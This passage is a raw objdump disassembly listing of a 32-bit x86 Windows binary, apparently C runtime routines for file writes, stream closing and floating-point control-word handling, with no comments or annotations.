  40bb08:	68 e9 fd 00 00       	push   $0xfde9
  40bb0d:	e8 af d2 ff ff       	call   0x408dc1
  40bb12:	8b 75 08             	mov    0x8(%ebp),%esi
  40bb15:	83 c4 20             	add    $0x20,%esp
  40bb18:	89 85 e8 eb ff ff    	mov    %eax,-0x1418(%ebp)
  40bb1e:	85 c0                	test   %eax,%eax
  40bb20:	74 51                	je     0x40bb73
  40bb22:	33 db                	xor    %ebx,%ebx
  40bb24:	85 c0                	test   %eax,%eax
  40bb26:	74 35                	je     0x40bb5d
  40bb28:	6a 00                	push   $0x0
  40bb2a:	8d 8d ec eb ff ff    	lea    -0x1414(%ebp),%ecx
  40bb30:	2b c3                	sub    %ebx,%eax
  40bb32:	51                   	push   %ecx
  40bb33:	50                   	push   %eax
  40bb34:	8d 85 f8 eb ff ff    	lea    -0x1408(%ebp),%eax
  40bb3a:	03 c3                	add    %ebx,%eax
  40bb3c:	50                   	push   %eax
  40bb3d:	ff b5 f0 eb ff ff    	push   -0x1410(%ebp)
  40bb43:	ff 15 24 f1 40 00    	call   *0x40f124
  40bb49:	85 c0                	test   %eax,%eax
  40bb4b:	74 26                	je     0x40bb73
  40bb4d:	03 9d ec eb ff ff    	add    -0x1414(%ebp),%ebx
  40bb53:	8b 85 e8 eb ff ff    	mov    -0x1418(%ebp),%eax
  40bb59:	3b d8                	cmp    %eax,%ebx
  40bb5b:	72 cb                	jb     0x40bb28
  40bb5d:	8b c7                	mov    %edi,%eax
  40bb5f:	2b 45 10             	sub    0x10(%ebp),%eax
  40bb62:	89 46 04             	mov    %eax,0x4(%esi)
  40bb65:	3b bd f4 eb ff ff    	cmp    -0x140c(%ebp),%edi
  40bb6b:	0f 82 46 ff ff ff    	jb     0x40bab7
  40bb71:	eb 08                	jmp    0x40bb7b
  40bb73:	ff 15 70 f0 40 00    	call   *0x40f070
  40bb79:	89 06                	mov    %eax,(%esi)
  40bb7b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40bb7e:	8b c6                	mov    %esi,%eax
  40bb80:	5f                   	pop    %edi
  40bb81:	5e                   	pop    %esi
  40bb82:	33 cd                	xor    %ebp,%ecx
  40bb84:	5b                   	pop    %ebx
  40bb85:	e8 bb 7b ff ff       	call   0x403745
  40bb8a:	c9                   	leave
  40bb8b:	c3                   	ret
  40bb8c:	6a 10                	push   $0x10
  40bb8e:	68 58 4b 41 00       	push   $0x414b58
  40bb93:	e8 58 86 ff ff       	call   0x4041f0
  40bb98:	8b 75 08             	mov    0x8(%ebp),%esi
  40bb9b:	83 fe fe             	cmp    $0xfffffffe,%esi
  40bb9e:	75 18                	jne    0x40bbb8
  40bba0:	e8 03 b9 ff ff       	call   0x4074a8
  40bba5:	83 20 00             	andl   $0x0,(%eax)
  40bba8:	e8 0e b9 ff ff       	call   0x4074bb
  40bbad:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40bbb3:	e9 b3 00 00 00       	jmp    0x40bc6b
  40bbb8:	85 f6                	test   %esi,%esi
  40bbba:	0f 88 93 00 00 00    	js     0x40bc53
  40bbc0:	3b 35 c8 72 41 00    	cmp    0x4172c8,%esi
  40bbc6:	0f 83 87 00 00 00    	jae    0x40bc53
  40bbcc:	8b de                	mov    %esi,%ebx
  40bbce:	c1 fb 06             	sar    $0x6,%ebx
  40bbd1:	8b c6                	mov    %esi,%eax
  40bbd3:	83 e0 3f             	and    $0x3f,%eax
  40bbd6:	6b c8 38             	imul   $0x38,%eax,%ecx
  40bbd9:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  40bbdc:	8b 04 9d c8 70 41 00 	mov    0x4170c8(,%ebx,4),%eax
  40bbe3:	f6 44 08 28 01       	testb  $0x1,0x28(%eax,%ecx,1)
  40bbe8:	74 69                	je     0x40bc53
  40bbea:	56                   	push   %esi
  40bbeb:	e8 c5 d4 ff ff       	call   0x4090b5
  40bbf0:	59                   	pop    %ecx
  40bbf1:	83 cf ff             	or     $0xffffffff,%edi
  40bbf4:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  40bbf7:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40bbfb:	8b 04 9d c8 70 41 00 	mov    0x4170c8(,%ebx,4),%eax
  40bc02:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  40bc05:	f6 44 08 28 01       	testb  $0x1,0x28(%eax,%ecx,1)
  40bc0a:	75 15                	jne    0x40bc21
  40bc0c:	e8 aa b8 ff ff       	call   0x4074bb
  40bc11:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40bc17:	e8 8c b8 ff ff       	call   0x4074a8
  40bc1c:	83 20 00             	andl   $0x0,(%eax)
  40bc1f:	eb 14                	jmp    0x40bc35
  40bc21:	ff 75 10             	push   0x10(%ebp)
  40bc24:	ff 75 0c             	push   0xc(%ebp)
  40bc27:	56                   	push   %esi
  40bc28:	e8 51 00 00 00       	call   0x40bc7e
  40bc2d:	83 c4 0c             	add    $0xc,%esp
  40bc30:	8b f8                	mov    %eax,%edi
  40bc32:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  40bc35:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40bc3c:	e8 0a 00 00 00       	call   0x40bc4b
  40bc41:	8b c7                	mov    %edi,%eax
  40bc43:	eb 29                	jmp    0x40bc6e
  40bc45:	8b 75 08             	mov    0x8(%ebp),%esi
  40bc48:	8b 7d e4             	mov    -0x1c(%ebp),%edi
  40bc4b:	56                   	push   %esi
  40bc4c:	e8 87 d4 ff ff       	call   0x4090d8
  40bc51:	59                   	pop    %ecx
  40bc52:	c3                   	ret
  40bc53:	e8 50 b8 ff ff       	call   0x4074a8
  40bc58:	83 20 00             	andl   $0x0,(%eax)
  40bc5b:	e8 5b b8 ff ff       	call   0x4074bb
  40bc60:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40bc66:	e8 93 b7 ff ff       	call   0x4073fe
  40bc6b:	83 c8 ff             	or     $0xffffffff,%eax
  40bc6e:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40bc71:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40bc78:	59                   	pop    %ecx
  40bc79:	5f                   	pop    %edi
  40bc7a:	5e                   	pop    %esi
  40bc7b:	5b                   	pop    %ebx
  40bc7c:	c9                   	leave
  40bc7d:	c3                   	ret
  40bc7e:	8b ff                	mov    %edi,%edi
  40bc80:	55                   	push   %ebp
  40bc81:	8b ec                	mov    %esp,%ebp
  40bc83:	83 ec 28             	sub    $0x28,%esp
  40bc86:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40bc89:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40bc8c:	53                   	push   %ebx
  40bc8d:	56                   	push   %esi
  40bc8e:	8b 75 08             	mov    0x8(%ebp),%esi
  40bc91:	57                   	push   %edi
  40bc92:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40bc95:	89 7d f4             	mov    %edi,-0xc(%ebp)
  40bc98:	85 c9                	test   %ecx,%ecx
  40bc9a:	0f 84 b1 01 00 00    	je     0x40be51
  40bca0:	85 ff                	test   %edi,%edi
  40bca2:	75 20                	jne    0x40bcc4
  40bca4:	e8 ff b7 ff ff       	call   0x4074a8
  40bca9:	83 20 00             	andl   $0x0,(%eax)
  40bcac:	e8 0a b8 ff ff       	call   0x4074bb
  40bcb1:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  40bcb7:	e8 42 b7 ff ff       	call   0x4073fe
  40bcbc:	83 c8 ff             	or     $0xffffffff,%eax
  40bcbf:	e9 8f 01 00 00       	jmp    0x40be53
  40bcc4:	8b c6                	mov    %esi,%eax
  40bcc6:	8b d6                	mov    %esi,%edx
  40bcc8:	c1 fa 06             	sar    $0x6,%edx
  40bccb:	83 e0 3f             	and    $0x3f,%eax
  40bcce:	6b c0 38             	imul   $0x38,%eax,%eax
  40bcd1:	89 55 f0             	mov    %edx,-0x10(%ebp)
  40bcd4:	8b 14 95 c8 70 41 00 	mov    0x4170c8(,%edx,4),%edx
  40bcdb:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40bcde:	8a 5c 02 29          	mov    0x29(%edx,%eax,1),%bl
  40bce2:	80 fb 02             	cmp    $0x2,%bl
  40bce5:	74 05                	je     0x40bcec
  40bce7:	80 fb 01             	cmp    $0x1,%bl
  40bcea:	75 0b                	jne    0x40bcf7
  40bcec:	8b c1                	mov    %ecx,%eax
  40bcee:	f7 d0                	not    %eax
  40bcf0:	a8 01                	test   $0x1,%al
  40bcf2:	74 b0                	je     0x40bca4
  40bcf4:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40bcf7:	f6 44 02 28 20       	testb  $0x20,0x28(%edx,%eax,1)
  40bcfc:	74 0f                	je     0x40bd0d
  40bcfe:	6a 02                	push   $0x2
  40bd00:	6a 00                	push   $0x0
  40bd02:	6a 00                	push   $0x0
  40bd04:	56                   	push   %esi
  40bd05:	e8 0b 06 00 00       	call   0x40c315
  40bd0a:	83 c4 10             	add    $0x10,%esp
  40bd0d:	56                   	push   %esi
  40bd0e:	e8 12 fb ff ff       	call   0x40b825
  40bd13:	59                   	pop    %ecx
  40bd14:	84 c0                	test   %al,%al
  40bd16:	74 39                	je     0x40bd51
  40bd18:	84 db                	test   %bl,%bl
  40bd1a:	74 22                	je     0x40bd3e
  40bd1c:	fe cb                	dec    %bl
  40bd1e:	80 fb 01             	cmp    $0x1,%bl
  40bd21:	0f 87 f4 00 00 00    	ja     0x40be1b
  40bd27:	ff 75 fc             	push   -0x4(%ebp)
  40bd2a:	8d 45 d8             	lea    -0x28(%ebp),%eax
  40bd2d:	57                   	push   %edi
  40bd2e:	50                   	push   %eax
  40bd2f:	e8 89 fa ff ff       	call   0x40b7bd
  40bd34:	83 c4 0c             	add    $0xc,%esp
  40bd37:	8b f0                	mov    %eax,%esi
  40bd39:	e9 9c 00 00 00       	jmp    0x40bdda
  40bd3e:	ff 75 fc             	push   -0x4(%ebp)
  40bd41:	8d 45 d8             	lea    -0x28(%ebp),%eax
  40bd44:	57                   	push   %edi
  40bd45:	56                   	push   %esi
  40bd46:	50                   	push   %eax
  40bd47:	e8 c5 f6 ff ff       	call   0x40b411
  40bd4c:	83 c4 10             	add    $0x10,%esp
  40bd4f:	eb e6                	jmp    0x40bd37
  40bd51:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40bd54:	8b 0c 85 c8 70 41 00 	mov    0x4170c8(,%eax,4),%ecx
  40bd5b:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40bd5e:	80 7c 01 28 00       	cmpb   $0x0,0x28(%ecx,%eax,1)
  40bd63:	7d 46                	jge    0x40bdab
  40bd65:	0f be c3             	movsbl %bl,%eax
  40bd68:	83 e8 00             	sub    $0x0,%eax
  40bd6b:	74 2e                	je     0x40bd9b
  40bd6d:	83 e8 01             	sub    $0x1,%eax
  40bd70:	74 19                	je     0x40bd8b
  40bd72:	83 e8 01             	sub    $0x1,%eax
  40bd75:	0f 85 a0 00 00 00    	jne    0x40be1b
  40bd7b:	ff 75 fc             	push   -0x4(%ebp)
  40bd7e:	8d 45 d8             	lea    -0x28(%ebp),%eax
  40bd81:	57                   	push   %edi
  40bd82:	56                   	push   %esi
  40bd83:	50                   	push   %eax
  40bd84:	e8 e8 fb ff ff       	call   0x40b971
  40bd89:	eb c1                	jmp    0x40bd4c
  40bd8b:	ff 75 fc             	push   -0x4(%ebp)
  40bd8e:	8d 45 d8             	lea    -0x28(%ebp),%eax
  40bd91:	57                   	push   %edi
  40bd92:	56                   	push   %esi
  40bd93:	50                   	push   %eax
  40bd94:	e8 c1 fc ff ff       	call   0x40ba5a
  40bd99:	eb b1                	jmp    0x40bd4c
  40bd9b:	ff 75 fc             	push   -0x4(%ebp)
  40bd9e:	8d 45 d8             	lea    -0x28(%ebp),%eax
  40bda1:	57                   	push   %edi
  40bda2:	56                   	push   %esi
  40bda3:	50                   	push   %eax
  40bda4:	e8 ed fa ff ff       	call   0x40b896
  40bda9:	eb a1                	jmp    0x40bd4c
  40bdab:	8b 4c 01 18          	mov    0x18(%ecx,%eax,1),%ecx
  40bdaf:	8d 7d d8             	lea    -0x28(%ebp),%edi
  40bdb2:	33 c0                	xor    %eax,%eax
  40bdb4:	ab                   	stos   %eax,%es:(%edi)
  40bdb5:	6a 00                	push   $0x0
  40bdb7:	ab                   	stos   %eax,%es:(%edi)
  40bdb8:	ab                   	stos   %eax,%es:(%edi)
  40bdb9:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40bdbc:	50                   	push   %eax
  40bdbd:	ff 75 fc             	push   -0x4(%ebp)
  40bdc0:	ff 75 f4             	push   -0xc(%ebp)
  40bdc3:	51                   	push   %ecx
  40bdc4:	ff 15 24 f1 40 00    	call   *0x40f124
  40bdca:	85 c0                	test   %eax,%eax
  40bdcc:	75 09                	jne    0x40bdd7
  40bdce:	ff 15 70 f0 40 00    	call   *0x40f070
  40bdd4:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40bdd7:	8d 75 d8             	lea    -0x28(%ebp),%esi
  40bdda:	8d 7d e4             	lea    -0x1c(%ebp),%edi
  40bddd:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40bdde:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40bddf:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40bde0:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40bde3:	85 c0                	test   %eax,%eax
  40bde5:	75 65                	jne    0x40be4c
  40bde7:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40bdea:	85 c0                	test   %eax,%eax
  40bdec:	74 2a                	je     0x40be18
  40bdee:	6a 05                	push   $0x5
  40bdf0:	5e                   	pop    %esi
  40bdf1:	3b c6                	cmp    %esi,%eax
  40bdf3:	75 17                	jne    0x40be0c
  40bdf5:	e8 c1 b6 ff ff       	call   0x4074bb
  40bdfa:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40be00:	e8 a3 b6 ff ff       	call   0x4074a8
  40be05:	89 30                	mov    %esi,(%eax)
  40be07:	e9 b0 fe ff ff       	jmp    0x40bcbc
  40be0c:	50                   	push   %eax
  40be0d:	e8 73 b6 ff ff       	call   0x407485
  40be12:	59                   	pop    %ecx
  40be13:	e9 a4 fe ff ff       	jmp    0x40bcbc
  40be18:	8b 7d f4             	mov    -0xc(%ebp),%edi
  40be1b:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40be1e:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40be21:	8b 04 85 c8 70 41 00 	mov    0x4170c8(,%eax,4),%eax
  40be28:	f6 44 08 28 40       	testb  $0x40,0x28(%eax,%ecx,1)
  40be2d:	74 05                	je     0x40be34
  40be2f:	80 3f 1a             	cmpb   $0x1a,(%edi)
  40be32:	74 1d                	je     0x40be51
  40be34:	e8 82 b6 ff ff       	call   0x4074bb
  40be39:	c7 00 1c 00 00 00    	movl   $0x1c,(%eax)
  40be3f:	e8 64 b6 ff ff       	call   0x4074a8
  40be44:	83 20 00             	andl   $0x0,(%eax)
  40be47:	e9 70 fe ff ff       	jmp    0x40bcbc
  40be4c:	2b 45 ec             	sub    -0x14(%ebp),%eax
  40be4f:	eb 02                	jmp    0x40be53
  40be51:	33 c0                	xor    %eax,%eax
  40be53:	5f                   	pop    %edi
  40be54:	5e                   	pop    %esi
  40be55:	5b                   	pop    %ebx
  40be56:	c9                   	leave
  40be57:	c3                   	ret
  40be58:	6a 10                	push   $0x10
  40be5a:	68 78 4b 41 00       	push   $0x414b78
  40be5f:	e8 8c 83 ff ff       	call   0x4041f0
  40be64:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  40be68:	6a 08                	push   $0x8
  40be6a:	e8 4e bb ff ff       	call   0x4079bd
  40be6f:	59                   	pop    %ecx
  40be70:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40be74:	6a 03                	push   $0x3
  40be76:	5e                   	pop    %esi
  40be77:	89 75 e0             	mov    %esi,-0x20(%ebp)
  40be7a:	3b 35 e8 72 41 00    	cmp    0x4172e8,%esi
  40be80:	74 59                	je     0x40bedb
  40be82:	a1 ec 72 41 00       	mov    0x4172ec,%eax
  40be87:	8b 04 b0             	mov    (%eax,%esi,4),%eax
  40be8a:	85 c0                	test   %eax,%eax
  40be8c:	74 4a                	je     0x40bed8
  40be8e:	8b 40 0c             	mov    0xc(%eax),%eax
  40be91:	90                   	nop
  40be92:	c1 e8 0d             	shr    $0xd,%eax
  40be95:	a8 01                	test   $0x1,%al
  40be97:	74 16                	je     0x40beaf
  40be99:	a1 ec 72 41 00       	mov    0x4172ec,%eax
  40be9e:	ff 34 b0             	push   (%eax,%esi,4)
  40bea1:	e8 33 05 00 00       	call   0x40c3d9
  40bea6:	59                   	pop    %ecx
  40bea7:	83 f8 ff             	cmp    $0xffffffff,%eax
  40beaa:	74 03                	je     0x40beaf
  40beac:	ff 45 e4             	incl   -0x1c(%ebp)
  40beaf:	a1 ec 72 41 00       	mov    0x4172ec,%eax
  40beb4:	8b 04 b0             	mov    (%eax,%esi,4),%eax
  40beb7:	83 c0 20             	add    $0x20,%eax
  40beba:	50                   	push   %eax
  40bebb:	ff 15 88 f1 40 00    	call   *0x40f188
  40bec1:	a1 ec 72 41 00       	mov    0x4172ec,%eax
  40bec6:	ff 34 b0             	push   (%eax,%esi,4)
  40bec9:	e8 f9 bb ff ff       	call   0x407ac7
  40bece:	59                   	pop    %ecx
  40becf:	a1 ec 72 41 00       	mov    0x4172ec,%eax
  40bed4:	83 24 b0 00          	andl   $0x0,(%eax,%esi,4)
  40bed8:	46                   	inc    %esi
  40bed9:	eb 9c                	jmp    0x40be77
  40bedb:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40bee2:	e8 13 00 00 00       	call   0x40befa
  40bee7:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40beea:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40beed:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40bef4:	59                   	pop    %ecx
  40bef5:	5f                   	pop    %edi
  40bef6:	5e                   	pop    %esi
  40bef7:	5b                   	pop    %ebx
  40bef8:	c9                   	leave
  40bef9:	c3                   	ret
  40befa:	6a 08                	push   $0x8
  40befc:	e8 04 bb ff ff       	call   0x407a05
  40bf01:	59                   	pop    %ecx
  40bf02:	c3                   	ret
  40bf03:	8b ff                	mov    %edi,%edi
  40bf05:	55                   	push   %ebp
  40bf06:	8b ec                	mov    %esp,%ebp
  40bf08:	56                   	push   %esi
  40bf09:	8b 75 08             	mov    0x8(%ebp),%esi
  40bf0c:	57                   	push   %edi
  40bf0d:	8d 7e 0c             	lea    0xc(%esi),%edi
  40bf10:	8b 07                	mov    (%edi),%eax
  40bf12:	90                   	nop
  40bf13:	c1 e8 0d             	shr    $0xd,%eax
  40bf16:	a8 01                	test   $0x1,%al
  40bf18:	74 25                	je     0x40bf3f
  40bf1a:	8b 07                	mov    (%edi),%eax
  40bf1c:	90                   	nop
  40bf1d:	c1 e8 06             	shr    $0x6,%eax
  40bf20:	a8 01                	test   $0x1,%al
  40bf22:	74 1b                	je     0x40bf3f
  40bf24:	ff 76 04             	push   0x4(%esi)
  40bf27:	e8 9b bb ff ff       	call   0x407ac7
  40bf2c:	59                   	pop    %ecx
  40bf2d:	b8 bf fe ff ff       	mov    $0xfffffebf,%eax
  40bf32:	f0 21 07             	lock and %eax,(%edi)
  40bf35:	33 c0                	xor    %eax,%eax
  40bf37:	89 46 04             	mov    %eax,0x4(%esi)
  40bf3a:	89 06                	mov    %eax,(%esi)
  40bf3c:	89 46 08             	mov    %eax,0x8(%esi)
  40bf3f:	5f                   	pop    %edi
  40bf40:	5e                   	pop    %esi
  40bf41:	5d                   	pop    %ebp
  40bf42:	c3                   	ret
  40bf43:	8b ff                	mov    %edi,%edi
  40bf45:	55                   	push   %ebp
  40bf46:	8b ec                	mov    %esp,%ebp
  40bf48:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40bf4b:	83 f9 fe             	cmp    $0xfffffffe,%ecx
  40bf4e:	75 0d                	jne    0x40bf5d
  40bf50:	e8 66 b5 ff ff       	call   0x4074bb
  40bf55:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40bf5b:	eb 38                	jmp    0x40bf95
  40bf5d:	85 c9                	test   %ecx,%ecx
  40bf5f:	78 24                	js     0x40bf85
  40bf61:	3b 0d c8 72 41 00    	cmp    0x4172c8,%ecx
  40bf67:	73 1c                	jae    0x40bf85
  40bf69:	8b c1                	mov    %ecx,%eax
  40bf6b:	83 e1 3f             	and    $0x3f,%ecx
  40bf6e:	c1 f8 06             	sar    $0x6,%eax
  40bf71:	6b c9 38             	imul   $0x38,%ecx,%ecx
  40bf74:	8b 04 85 c8 70 41 00 	mov    0x4170c8(,%eax,4),%eax
  40bf7b:	0f b6 44 08 28       	movzbl 0x28(%eax,%ecx,1),%eax
  40bf80:	83 e0 40             	and    $0x40,%eax
  40bf83:	5d                   	pop    %ebp
  40bf84:	c3                   	ret
  40bf85:	e8 31 b5 ff ff       	call   0x4074bb
  40bf8a:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40bf90:	e8 69 b4 ff ff       	call   0x4073fe
  40bf95:	33 c0                	xor    %eax,%eax
  40bf97:	5d                   	pop    %ebp
  40bf98:	c3                   	ret
  40bf99:	6a 08                	push   $0x8
  40bf9b:	68 98 4b 41 00       	push   $0x414b98
  40bfa0:	e8 4b 82 ff ff       	call   0x4041f0
  40bfa5:	83 3d 54 6c 41 00 01 	cmpl   $0x1,0x416c54
  40bfac:	7c 5b                	jl     0x40c009
  40bfae:	8b 45 08             	mov    0x8(%ebp),%eax
  40bfb1:	a8 40                	test   $0x40,%al
  40bfb3:	74 4a                	je     0x40bfff
  40bfb5:	83 3d 50 67 41 00 00 	cmpl   $0x0,0x416750
  40bfbc:	74 41                	je     0x40bfff
  40bfbe:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40bfc2:	0f ae 55 08          	ldmxcsr 0x8(%ebp)
  40bfc6:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40bfcd:	eb 3a                	jmp    0x40c009
  40bfcf:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40bfd2:	8b 00                	mov    (%eax),%eax
  40bfd4:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%eax)
  40bfda:	74 0b                	je     0x40bfe7
  40bfdc:	81 38 1d 00 00 c0    	cmpl   $0xc000001d,(%eax)
  40bfe2:	74 03                	je     0x40bfe7
  40bfe4:	33 c0                	xor    %eax,%eax
  40bfe6:	c3                   	ret
  40bfe7:	33 c0                	xor    %eax,%eax
  40bfe9:	40                   	inc    %eax
  40bfea:	c3                   	ret
  40bfeb:	8b 65 e8             	mov    -0x18(%ebp),%esp
  40bfee:	83 25 50 67 41 00 00 	andl   $0x0,0x416750
  40bff5:	83 65 08 bf          	andl   $0xffffffbf,0x8(%ebp)
  40bff9:	0f ae 55 08          	ldmxcsr 0x8(%ebp)
  40bffd:	eb c7                	jmp    0x40bfc6
  40bfff:	83 e0 bf             	and    $0xffffffbf,%eax
  40c002:	89 45 08             	mov    %eax,0x8(%ebp)
  40c005:	0f ae 55 08          	ldmxcsr 0x8(%ebp)
  40c009:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40c00c:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40c013:	59                   	pop    %ecx
  40c014:	5f                   	pop    %edi
  40c015:	5e                   	pop    %esi
  40c016:	5b                   	pop    %ebx
  40c017:	c9                   	leave
  40c018:	c3                   	ret
  40c019:	8b ff                	mov    %edi,%edi
  40c01b:	55                   	push   %ebp
  40c01c:	8b ec                	mov    %esp,%ebp
  40c01e:	51                   	push   %ecx
  40c01f:	dd 7d fc             	fnstsw -0x4(%ebp)
  40c022:	db e2                	fnclex
  40c024:	0f bf 45 fc          	movswl -0x4(%ebp),%eax
  40c028:	c9                   	leave
  40c029:	c3                   	ret
  40c02a:	8b ff                	mov    %edi,%edi
  40c02c:	55                   	push   %ebp
  40c02d:	8b ec                	mov    %esp,%ebp
  40c02f:	51                   	push   %ecx
  40c030:	51                   	push   %ecx
  40c031:	9b d9 7d fc          	fstcw  -0x4(%ebp)
  40c035:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40c038:	8b 45 08             	mov    0x8(%ebp),%eax
  40c03b:	f7 d1                	not    %ecx
  40c03d:	66 23 4d fc          	and    -0x4(%ebp),%cx
  40c041:	23 45 0c             	and    0xc(%ebp),%eax
  40c044:	66 0b c8             	or     %ax,%cx
  40c047:	66 89 4d f8          	mov    %cx,-0x8(%ebp)
  40c04b:	d9 6d f8             	fldcw  -0x8(%ebp)
  40c04e:	0f bf 45 fc          	movswl -0x4(%ebp),%eax
  40c052:	c9                   	leave
  40c053:	c3                   	ret
  40c054:	8b ff                	mov    %edi,%edi
  40c056:	55                   	push   %ebp
  40c057:	8b ec                	mov    %esp,%ebp
  40c059:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40c05c:	83 ec 0c             	sub    $0xc,%esp
  40c05f:	f6 c1 01             	test   $0x1,%cl
  40c062:	74 0a                	je     0x40c06e
  40c064:	db 2d 08 31 41 00    	fldt   0x413108
  40c06a:	db 5d fc             	fistpl -0x4(%ebp)
  40c06d:	9b                   	fwait
  40c06e:	f6 c1 08             	test   $0x8,%cl
  40c071:	74 10                	je     0x40c083
  40c073:	9b df e0             	fstsw  %ax
  40c076:	db 2d 08 31 41 00    	fldt   0x413108
  40c07c:	dd 5d f4             	fstpl  -0xc(%ebp)
  40c07f:	9b 9b df e0          	fstsw  %ax
  40c083:	f6 c1 10             	test   $0x10,%cl
  40c086:	74 0a                	je     0x40c092
  40c088:	db 2d 14 31 41 00    	fldt   0x413114
  40c08e:	dd 5d f4             	fstpl  -0xc(%ebp)
  40c091:	9b                   	fwait
  40c092:	f6 c1 04             	test   $0x4,%cl
  40c095:	74 09                	je     0x40c0a0
  40c097:	d9 ee                	fldz
  40c099:	d9 e8                	fld1
  40c09b:	de f1                	fdivp  %st,%st(1)
  40c09d:	dd d8                	fstp   %st(0)
  40c09f:	9b                   	fwait
  40c0a0:	f6 c1 20             	test   $0x20,%cl
  40c0a3:	74 06                	je     0x40c0ab
  40c0a5:	d9 eb                	fldpi
  40c0a7:	dd 5d f4             	fstpl  -0xc(%ebp)
  40c0aa:	9b                   	fwait
  40c0ab:	c9                   	leave
  40c0ac:	c3                   	ret
  40c0ad:	8b ff                	mov    %edi,%edi
  40c0af:	55                   	push   %ebp
  40c0b0:	8b ec                	mov    %esp,%ebp
  40c0b2:	51                   	push   %ecx
  40c0b3:	9b dd 7d fc          	fstsw  -0x4(%ebp)
  40c0b7:	0f bf 45 fc          	movswl -0x4(%ebp),%eax
  40c0bb:	c9                   	leave
  40c0bc:	c3                   	ret
  40c0bd:	8b ff                	mov    %edi,%edi
  40c0bf:	55                   	push   %ebp
  40c0c0:	8b ec                	mov    %esp,%ebp
  40c0c2:	83 ec 10             	sub    $0x10,%esp
  40c0c5:	ff 75 0c             	push   0xc(%ebp)
  40c0c8:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40c0cb:	e8 90 97 ff ff       	call   0x405860
  40c0d0:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40c0d3:	68 00 80 00 00       	push   $0x8000
  40c0d8:	ff 75 08             	push   0x8(%ebp)
  40c0db:	ff 30                	push   (%eax)
  40c0dd:	e8 44 a4 ff ff       	call   0x406526
  40c0e2:	83 c4 0c             	add    $0xc,%esp
  40c0e5:	80 7d fc 00          	cmpb   $0x0,-0x4(%ebp)
  40c0e9:	74 0a                	je     0x40c0f5
  40c0eb:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40c0ee:	83 a1 50 03 00 00 fd 	andl   $0xfffffffd,0x350(%ecx)
  40c0f5:	c9                   	leave
  40c0f6:	c3                   	ret
  40c0f7:	8b ff                	mov    %edi,%edi
  40c0f9:	55                   	push   %ebp
  40c0fa:	8b ec                	mov    %esp,%ebp
  40c0fc:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40c0ff:	80 39 00             	cmpb   $0x0,(%ecx)
  40c102:	75 05                	jne    0x40c109
  40c104:	33 c0                	xor    %eax,%eax
  40c106:	40                   	inc    %eax
  40c107:	eb 16                	jmp    0x40c11f
  40c109:	80 79 01 00          	cmpb   $0x0,0x1(%ecx)
  40c10d:	75 05                	jne    0x40c114
  40c10f:	6a 02                	push   $0x2
  40c111:	58                   	pop    %eax
  40c112:	eb 0b                	jmp    0x40c11f
  40c114:	33 c0                	xor    %eax,%eax
  40c116:	38 41 02             	cmp    %al,0x2(%ecx)
  40c119:	0f 95 c0             	setne  %al
  40c11c:	83 c0 03             	add    $0x3,%eax
  40c11f:	5d                   	pop    %ebp
  40c120:	c2 04 00             	ret    $0x4
  40c123:	8b ff                	mov    %edi,%edi
  40c125:	55                   	push   %ebp
  40c126:	8b ec                	mov    %esp,%ebp
  40c128:	51                   	push   %ecx
  40c129:	ff 75 14             	push   0x14(%ebp)
  40c12c:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40c12f:	ff 75 10             	push   0x10(%ebp)
  40c132:	ff 75 0c             	push   0xc(%ebp)
  40c135:	50                   	push   %eax
  40c136:	e8 22 03 00 00       	call   0x40c45d
  40c13b:	8b d0                	mov    %eax,%edx
  40c13d:	83 c4 10             	add    $0x10,%esp
  40c140:	83 fa 04             	cmp    $0x4,%edx
  40c143:	77 1a                	ja     0x40c15f
  40c145:	8b 4d fc             	mov    -0x4(%ebp),%ecx
